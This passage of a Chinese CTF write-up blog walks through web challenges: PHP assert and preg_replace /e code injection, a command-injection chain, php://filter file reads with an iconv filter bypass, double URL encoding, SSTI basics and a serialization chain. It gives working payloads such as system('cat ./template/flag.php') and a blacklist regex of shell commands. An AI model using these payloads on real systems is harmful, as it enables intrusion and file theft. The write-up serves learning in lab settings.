system(&#x27;cat ./templates/flag.php&#x27;);//.php&quot;</span><br></pre></td></tr></table></figure><p>strpos()返回false，再利用or让其执行system函数，再用” &#x2F;&#x2F; “将后面的语句注释掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(&quot;strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);//.php, &#x27;..&#x27;) === false&quot;)</span><br></pre></td></tr></table></figure><p>下划线内容被注释掉了，所以assert执行了以下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);</span><br></pre></td></tr></table></figure><p><code>or</code>:如果表达式1为 <code>true</code>，那么整个逻辑或操作返回 <code>true</code>，不会再去计算表达式2,这被称为”短路评估”,如果表达式1为 <code>false</code>，那么整个逻辑或操作会继续评估表达式2，如果表达式2为 <code>true</code>，则整个操作返回 <code>true</code>，否则返回 <code>false</code></p><p>右键查看源代码</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927110013408.png" alt="image-20230927110013408"></p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;i = <span class="number">0</span>;j = tab.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        k = j + (l) + (n=<span class="number">0</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        n = tab2.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        o = tab[i-l];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        pass = p;<span class="keyword">return</span> pass;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>代码实际上就是将pass的用逗号分隔的数字当作ascii转换为字母，无论dechiffre函数传参什么，结果都是 <code>FAUX PASSWORD HAHA</code><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927123112312.png" alt="image-20230927123112312"></p><p>可以直接猜测dechiffre函数传参的那一串转换为文本</p><p>16进制转字符串：<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><code>55,56,54,79,115,69,114,116,107,49,50</code></p><p>ascii转文本：<a href="https://www.67tool.com/number/ascii-to-text">https://www.67tool.com/number/ascii-to-text</a></p><p><code>786OsErtk12</code></p><h3 id="初探SSTI"><a href="#初探SSTI" class="headerlink" title="初探SSTI"></a>初探SSTI</h3><p><code>MVC</code>是一种框架型模式，全名是Model View Controller,即模型－视图－控制器,这是一种业务逻辑、数据、界面显示分离的组织代码方式，便于web网站的维护和开发</p><p><code>模型</code>：处理数据验证，<code>控制器</code>：在模型和视图之间传递数据，<code>视图</code>：显示信息给用户</p><p>过程：用户的输入请求通过 View 接收，交给 Controller ，然后由 Controller 调用 Model ，验证信息后返回正确或错误给 Controller， Controller要求处理相应（正确则显示相应信息，错误404）的视图返回给浏览器。</p><p>模板（ssti漏洞产生原因）：是View 中会大量地用到的一种技术，用于定义数据如何渲染成最终的用户界面，而用户的输入由view接收，用户的恶意输入未经任何处理就将其作为 Web 应用模板内容的一部分，而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题，这样的服务器端模板引擎漏洞就是ssti漏洞。</p><h3 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h3><p>Python：jinja2、 mako、 tornado（框架）、 django</p><p>php：smarty、 twig</p><p>java：jade、 velocity</p><p>模板引擎生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，放到渲染函数里，生成模板+用户数据的前端html页面，最后反馈给浏览器。大部分模板引擎有提供沙箱隔离机制 , 但存在沙箱逃逸技术来绕过，这个后面再了解</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927230411892.png" alt="image-20230927230411892"></p><p>框架：在Web开发中，框架和模板通常一起使用。框架提供了应用程序的整体结构和逻辑，包括路由、控制器和数据模型等。模板则负责将数据渲染成HTML或其他格式的用户界面，以便呈现给终端用户。框架通常提供一种将数据传递给模板的机制。</p><h4 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig(PHP)"></a>Twig(PHP)</h4><p>Twig是一个用于PHP的流行的模板引擎</p><h4 id="Flask框架"><a href="#Flask框架" class="headerlink" title="Flask框架"></a>Flask框架</h4><p>渲染方法有两种 : <code>render_template()</code> 和 <code>render_template_string()</code></p><p><code>ender_template()</code> 函数，渲染一个指定的文件 , 这个指定的文件其实就是模板</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231612877.png" alt="image-20230927231612877"></p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231620453.png" alt="image-20230927231620453"></p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231649505.png" alt="image-20230927231649505"></p><p><code>render_template_string()</code> 函数渲染一个字符串</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231655444.png" alt="image-20230927231655444"></p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231701528.png" alt="image-20230927231701528"></p><p><code>render_template_string()</code>函数-&gt;ssti</p><h4 id="ssti简单例子"><a href="#ssti简单例子" class="headerlink" title="ssti简单例子"></a>ssti简单例子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    html = <span class="string">&#x27;&#123;&#123;12*12&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure><p>在flask框架中，模板引擎Jinja2会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行（flask+Jinja2是比较常用的组合）</p><h4 id="引擎判断"><a href="#引擎判断" class="headerlink" title="引擎判断"></a>引擎判断</h4><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927232317680.png" alt="image-20230927232317680"></p><p>绿色为执行成功，红色为执行失败，<code>&#123;&#123;7*'7'&#125;&#125;</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>77777777</code></p><h4 id="框架和模板概念区分"><a href="#框架和模板概念区分" class="headerlink" title="框架和模板概念区分"></a>框架和模板概念区分</h4><p>许多框架采用了MVC设计模式作为其架构的一部分，mvc是一种设计模型，而框架是以mvc为设计架构一部分的实体，Flask框架本身不是一个严格的MVC（Model-View-Controller）框架，但它提供了足够的灵活性，可以根据开发人员的需要实现MVC结构或其他类似的设计模式。</p><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>抓包加入字典判断猜测</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929163500908.png" alt="image-20230929163500908"></p><p>传%80，根据报错信息，网页中出现大量Django，说明是Django框架，匹配报错信息中database关键字</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929171119595.png" alt="image-20230929171119595"></p><p>根据database的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure><p>页面搜索ctf，找到flag</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929171327069.png"></p><p><code>?url=@/opt/api/api/settings.py</code>也可以访问配置文件settings.py，但是其实在上面的报错信息中就可以找到database的路径。另外，上面的报错信息是html代码，所以可以复制代码，打开为网页查看</p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929174327555.png" alt="image-20230929174327555"></p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929174353265.png" alt="image-20230929174353265"></p><p>这里就可以直观的看到setting中的database信息</p><p>附录：</p><p><code>url编码</code>：当 URL 路径或者查询参数中，带有中文或者特殊字符的时候，需要对 URL 进行编码。URL 之所以需要编码，是因为 URL 中的某些字符会引起歧义，比如 URL 查询参数中包含了”&amp;”或者”%”就会造成服务器解析错误。需要注意的是url编码采用的是十六进制，参照ascii码，比如？编码后是<code>%3F-&gt;63-&gt;?</code></p><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929170444274.png" alt="image-20230929170444274"></p><p>从1-127，因为%80的16进制解码后是128，超出了ascii的表示范围，所以会报错，%df,%a0同理</p><p><code>curl参数上传</code>:在PHP中使用CURL进行文件上传时，@符号加上文件路径,CURL将自动读取该文件内容并将其作为请求参数,即使输入的文件路径有错或不存在，CURL仍然可以正常上传。</p><h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>查看index.phps,相当于是index.php的备份吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>在url链接里直接运行，浏览器会进行一次url解码，所以要传入二次编码，就把a编码，由于a是在ascii表中，所以编码后依然是a，但我们知道a的ascii是97，所以%61解码后是a，直接再次编码，%2561</p><p>payload:<code>?id=%2561dmin</code></p><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>admin是字符串，开头不是数字，所以和0弱相等，经过测试admin在if条件判断中为真，所以if($a&#x3D;&#x3D;0 and $a)为真，b&#x3D;1235c，不是纯数字，开头数字大于1234即可</p><h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><p><img src="/img/image-20231010145235176.png" alt="image-20231010145235176"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;   </span><br><span class="line"></span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure><p>这里嵌套，使用第三种形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2033a&quot;,&quot;n&quot;:array(array(1,0),0)&#125; </span><br></pre></td></tr></table></figure><p>如果是<code>c=&#123;&quot;m&quot;:&quot;2033%00&quot;,&quot;n&quot;:[[0,2],0]&#125;</code>,就需要url编码，最好都编码一下</p><h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p><img src="/img/image-20231010150216244.png" alt="image-20231010150216244"></p><p>include一个check.php，说明一定有过滤，常规<code>php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="/img/image-20231010150320739.png" alt="image-20231010150320739"></p><p>尝试给filename传read、base64，encode被过滤，知道了过滤点，flag没有过滤<br>绕过：convert.过滤器支持convert.iconv.格式<br>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line">或</span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/convert.iconv.UTF-<span class="number">8</span>*.UCS-4LE*/resource=flag.php</span><br></pre></td></tr></table></figure><p>php支持的编码格式(部分)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac（别名：MacJapanese）</span><br><span class="line">SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）</span><br><span class="line">SJIS-Mobile#KDDI（别名：SJIS-KDDI）</span><br><span class="line">SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）</span><br><span class="line">UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）</span><br><span class="line">UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br><span class="line">ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）</span><br></pre></td></tr></table></figure><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/img/image-20231010153053389.png" alt="image-20231010153053389"></p><p>想上传.php后缀发现弹窗</p><p><img src="/img/image-20231010153126518.png" alt="image-20231010153126518"></p><p>上传键被禁</p><p><img src="/img/image-20231010153212033.png" alt="image-20231010153212033"></p><p>删了这个disable，直接上传即可</p><p><code>127.0.0.1 &amp;&amp; find / -name &quot;flag*&quot; </code>找不到flag的时候可以直接搜</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF&amp;0xgame</title>
      <link href="/SHCTF&amp;0xgame.html"/>
      <url>/SHCTF&amp;0xgame.html</url>
      
        <content type="html"><![CDATA[<h1 id="SHCTF"><a href="#SHCTF" class="headerlink" title="SHCTF"></a>SHCTF</h1><h2 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2><p>查看js，发现分数要大于99999，所以转到控制器</p><p><img src="/img/image-20231006131627245.png" alt="image-20231006131627245"></p><p>修改分数点击回车后，点击开始游戏就会弹出flag</p><p><img src="/img/image-20231006131558566.png" alt="image-20231006131558566"></p><p><img src="/img/image-20231006131759294.png" alt="image-20231006131759294"></p><p>法二：直接在js中发现won函数，里面的unicode编码解码后就是flag</p><p><img src="/img/image-20231006131912160.png" alt="image-20231006131912160"></p><h2 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pattern</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i&quot;</span>,<span class="variable">$code</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$pattern</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;print_r(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are smart&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;it is begin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">it is begin</span><br></pre></td></tr></table></figure><p>重点代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $pattern . &#x27;)/ei&#x27;,&#x27;print_r(&quot;\\1&quot;)&#x27;, $code);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?code=$&#123;phpinfo()&#125; HTTP/1.1</span><br><span class="line">pattern=\S*</span><br></pre></td></tr></table></figure><p>自己理解：正则匹配模式设置为：匹配输入字符串中的连续非空白字符序列，所以匹配到了${phpinfo()}，<code>\\1</code>捕获了该字符串，又由于是&#x2F;e模式：表示替换字符串中的匹配部分将被视为 PHP 代码，并执行它，所以<code>print_r(&quot;$&#123;phpinfo()&#125;&quot;)</code>被执行<br>在环境中找到flag<br><img src="/img/image-20231006144747769.png" alt="image-20231006144747769"></p><h2 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;z = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;q = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" 